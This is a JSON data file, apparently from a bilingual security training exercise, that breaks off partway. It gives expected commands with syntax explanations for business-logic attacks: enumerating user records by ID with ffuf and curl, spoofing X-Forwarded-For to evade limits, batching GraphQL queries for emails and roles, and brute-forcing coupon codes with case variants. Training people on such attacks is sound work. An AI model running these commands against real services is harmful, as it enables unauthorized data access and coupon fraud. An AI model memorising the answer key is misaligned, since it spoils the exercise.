    {
      "id": "bizlogic-id",
      "patches": [
        {
          "area": "wafBypass",
          "index": 0,
          "expectedCommand": "ffuf -w <(seq 1000 1100) -u 'https://{TARGET}/api/users/FUZZ' -H 'Authorization: Bearer {TOKEN}' -mc 200 -rate 20 -t 5",
          "syntaxBreakdown": [
            {
              "part": "ffuf",
              "explanation": {
                "zh": "目录爆破工具",
                "en": "web fuzzer"
              },
              "type": "function"
            },
            {
              "part": "-w <(seq 1000 1100)",
              "explanation": {
                "zh": "序列字典",
                "en": "sequence wordlist"
              },
              "type": "flag"
            },
            {
              "part": "-u 'https://{TARGET}/api/users/FUZZ'",
              "explanation": {
                "zh": "目标接口",
                "en": "target endpoint"
              },
              "type": "url"
            },
            {
              "part": "Authorization: Bearer {TOKEN}",
              "explanation": {
                "zh": "认证令牌头",
                "en": "bearer token header"
              },
              "type": "header"
            },
            {
              "part": "-mc 200",
              "explanation": {
                "zh": "筛200响应",
                "en": "filter 200s"
              },
              "type": "flag"
            },
            {
              "part": "-rate 20 -t 5",
              "explanation": {
                "zh": "限速并发",
                "en": "rate and threads"
              },
              "type": "flag"
            }
          ]
        },
        {
          "area": "wafBypass",
          "index": 1,
          "expectedCommand": "for id in $(seq 1000 1010); do curl -s -o /dev/null -w '%{http_code}\\n' -H 'Authorization: Bearer {TOKEN}' -H \"X-Forwarded-For: $RANDOM.$RANDOM.0.1\" https://{TARGET}/api/users/$id; done",
          "syntaxBreakdown": [
            {
              "part": "for id in $(seq 1000 1010)",
              "explanation": {
                "zh": "循环ID序列",
                "en": "loop over IDs"
              },
              "type": "control"
            },
            {
              "part": "curl -s -o /dev/null",
              "explanation": {
                "zh": "静默请求",
                "en": "silent request"
              },
              "type": "function"
            },
            {
              "part": "X-Forwarded-For: $RANDOM.$RANDOM.0.1",
              "explanation": {
                "zh": "伪造来源IP",
                "en": "spoofed source IP"
              },
              "type": "header"
            },
            {
              "part": "%{http_code}",
              "explanation": {
                "zh": "输出状态码",
                "en": "print status code"
              },
              "type": "value"
            }
          ]
        },
        {
          "area": "wafBypass",
          "index": 2,
          "expectedCommand": "{\"query\":\"{users(ids:[1001,1002,1003,1004]){id email role}}\"}",
          "syntaxBreakdown": [
            {
              "part": "{\"query\":\"{users(ids:[1001,1002,1003,1004]){id email role}}\"}",
              "explanation": {
                "zh": "批量GraphQL查询",
                "en": "batched GraphQL query"
              },
              "type": "payload"
            },
            {
              "part": "users(ids:[",
              "explanation": {
                "zh": "批量ID参数",
                "en": "batched ID argument"
              },
              "type": "value"
            },
            {
              "part": "id email role",
              "explanation": {
                "zh": "请求字段",
                "en": "requested fields"
              },
              "type": "value"
            }
          ]
        },
        {
          "area": "wafBypass",
          "index": 3,
          "expectedCommand": "for f in '{TARGET_ID}' '{TARGET_ID}-v2' 'u{TARGET_ID}' '1000{TARGET_ID}'; do curl -s -o /dev/null -w '%{http_code} '$f'\\n' -H 'Authorization: Bearer {TOKEN}' https://{TARGET}/api/users/$f; done",
          "syntaxBreakdown": [
            {
              "part": "for f in '{TARGET_ID}' '{TARGET_ID}-v2' 'u{TARGET_ID}' '1000{TARGET_ID}'",
              "explanation": {
                "zh": "格式变体列表",
                "en": "format variant list"
              },
              "type": "control"
            },
            {
              "part": "-w '%{http_code} '$f'\\n'",
              "explanation": {
                "zh": "输出状态与格式",
                "en": "print code and format"
              },
              "type": "value"
            },
            {
              "part": "/api/users/$f",
              "explanation": {
                "zh": "拼接目标URL",
                "en": "build target URL"
              },
              "type": "url"
            }
          ]
        }
      ]
    },
    {
      "id": "bizlogic-coupon-enumeration",
      "patches": [
        {
          "area": "wafBypass",
          "index": 0,
          "expectedCommand": "ffuf -w coupons.txt -u 'https://{TARGET}/api/coupon/FUZZ' -H 'Authorization: Bearer {TOKEN}' -mc 200 -rate 15",
          "syntaxBreakdown": [
            {
              "part": "ffuf",
              "explanation": {
                "zh": "目录爆破工具",
                "en": "web fuzzer"
              },
              "type": "function"
            },
            {
              "part": "-w coupons.txt",
              "explanation": {
                "zh": "优惠码字典",
                "en": "coupon wordlist"
              },
              "type": "flag"
            },
            {
              "part": "-u 'https://{TARGET}/api/coupon/FUZZ'",
              "explanation": {
                "zh": "核销接口",
                "en": "redemption endpoint"
              },
              "type": "url"
            },
            {
              "part": "-mc 200",
              "explanation": {
                "zh": "筛200响应",
                "en": "filter 200s"
              },
              "type": "flag"
            },
            {
              "part": "-rate 15",
              "explanation": {
                "zh": "限速探测",
                "en": "throttled probing"
              },
              "type": "flag"
            }
          ]
        },
        {
          "area": "wafBypass",
          "index": 1,
          "expectedCommand": "for c in coupon001 Coupon001 COUPON001; do curl -s -o /dev/null -w '%{http_code} '$c'\\n' https://{TARGET}/api/coupon/$c; done",
          "syntaxBreakdown": [
            {
              "part": "for c in coupon001 Coupon001 COUPON001",
              "explanation": {
                "zh": "大小写变体集",
                "en": "case variant set"
              },
              "type": "control"
            },
            {
              "part": "%{http_code} '$c'",
              "explanation": {
                "zh": "输出码与结果",
                "en": "print code and value"
              },
              "type": "value"
            },
            {
              "part": "/api/coupon/$c",
              "explanation": {
                "zh": "拼接目标URL",
                "en": "build target URL"
              },
              "type": "url"
            }
          ],
          "description": {
            "zh": "利用校验层与核销层的大小写处理不一致：精确匹配的拦截或去重规则只拦原样码，后端大小写不敏感时变形码仍可核销。判据：任一大小写变体被接受核销。",
            "en": "Case variance bypasses format validation. Success: any casing accepted."
          }
        },
        {
          "area": "wafBypass",
          "index": 2,
          "expectedCommand": "for y in 2021 2022 2023 2024 2025; do curl -s -o /dev/null -w '%{http_code} SAVE'$y'\\n' https://{TARGET}/api/coupon/SAVE$y; done",
          "syntaxBreakdown": [
            {
              "part": "for y in 2021 2022 2023 2024 2025",
              "explanation": {
                "zh": "年份循环",
                "en": "loop over years"
              },
              "type": "control"
            },
            {
              "part": "SAVE$y",
              "explanation": {
                "zh": "年份前缀码",
                "en": "year-prefixed code"
